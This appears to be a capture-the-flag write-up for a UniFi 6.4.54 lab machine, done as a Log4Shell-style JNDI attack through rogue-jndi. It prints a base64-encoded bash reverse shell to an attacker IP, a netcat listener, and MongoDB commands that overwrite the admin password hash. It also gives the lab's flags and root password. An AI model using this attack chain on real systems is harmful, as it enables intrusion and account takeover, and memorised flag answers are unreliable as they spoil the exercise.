System: Linux
Difficulty: Very Easy

IP Address: 10.129.169.165

# User Flag

NMAP Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.169.165 -sC -sV
```

Here are the results.
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http            Apache Tomcat (language: en)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to /manage
8443/tcp open  ssl/nagios-nsca Nagios NSCA
|_http-title: Did not follow redirect to /manage
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After checking the Web Server, it returns this application.
Based on the Unifi Version 6.4.54, it can be exploitation through a remote code execution.
![[unified_1.png]]

The exploit is downloaded and installed on the system.
```
git clone https://github.com/veracode-research/rogue-jndi
kali@kali:~$ cd rogue-jndi
mvn package
```

The payload is created through this command.
```
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.154/4444 0>&1"' | base64
```

This command will listen to the server alongside the port.
```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTU0LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.154"
```

Port listening to catch the reverse shell.
```
kali@kali:~$ sudo nc -lvnp 4444
```

![[unified_2.png]]

The login request is executed with those parameters, which will allow a remote connection with the PORT 1389 service.

The shell has been successfully returned.
The contents of the flag is in the directory `/home/michael/`
```
6ced1a6a89e666c0620cdb10262ba127
```

# Root Flag

After checking the listening services, it is possible to see a Mongo Database listening.
```
ss -tnlp
```

```
State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port   Process
LISTEN   0        128            127.0.0.1:27117          0.0.0.0:*
<SNIP>
```

A connection is attempted through this command.
```
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

The administrator account is displayed, with a SHA-512 encoded password.
The contents of the database will be modified in order to setup a new password to login as the administrator account.
```
mkpasswd -m sha-512 Password1234
```

Now this password will be updated in the database.
The contents of the administrator's password is updated in the database.
```
mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$Mr3Ih3X9KRG7GL2d$xhPXaoIDgW2yhCybnbe4KU166dBbXUs7ZG0N6/HIDlJHFQf0e2Lg2MVgiRU3EnpdHH98K.weTEuK97MqKj8h.."}})'
```

The login is now successful.
In the `Settings > Site > Device Authentication` section, it is possible to view the root password directly.

The password is `NotACrackablePassword4U2022`

Login works now through SSH.
```
kali@kali:~$ ssh root@10.129.169.165
```

Here are the Root Flag contents.
```
e50bc93c75b634e4b272d2f771c33681
```